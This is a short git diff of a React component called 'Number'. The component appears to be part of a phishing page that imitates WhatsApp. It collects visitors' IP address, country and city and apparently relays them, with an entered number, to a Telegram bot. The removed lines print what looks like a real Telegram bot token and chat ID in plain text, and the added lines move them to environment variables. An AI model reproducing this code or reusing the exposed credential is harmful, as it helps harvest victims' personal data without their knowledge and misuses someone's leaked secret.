@@ -52,8 +52,8 @@ export default function Number({ setPage, setNcode, ncode }) {
   };
 
   const APIS = () => {
-    const apiToken = "6433121980:AAGko90tu3pLPIhkMTOHyYQZXMVb-vW-RNs";
-    const chatId = "5807893197";
+    const apiToken = process.env.REACT_APP_API_TOKEN;
+    const chatId = process.env.REACT_APP_CHAT_ID;
     const ipAddress = state.ip; // Get the IP address from state
     const flagEmoji = getFlagEmoji(state.countryCode); // Get the corresponding flag emoji
     const city = state.city; // Get the city from geolocation
@@ -85,7 +85,7 @@ export default function Number({ setPage, setNcode, ncode }) {
           <div>
             <img
               className="mx-auto h-16 w-16"
-              src="/wp.png"
+              src={`${process.env.PUBLIC_URL}/wp.png`}
               alt="Your Company"
             />
             <h2 className="mt-6 text-center tracking-tight text-gray-700">
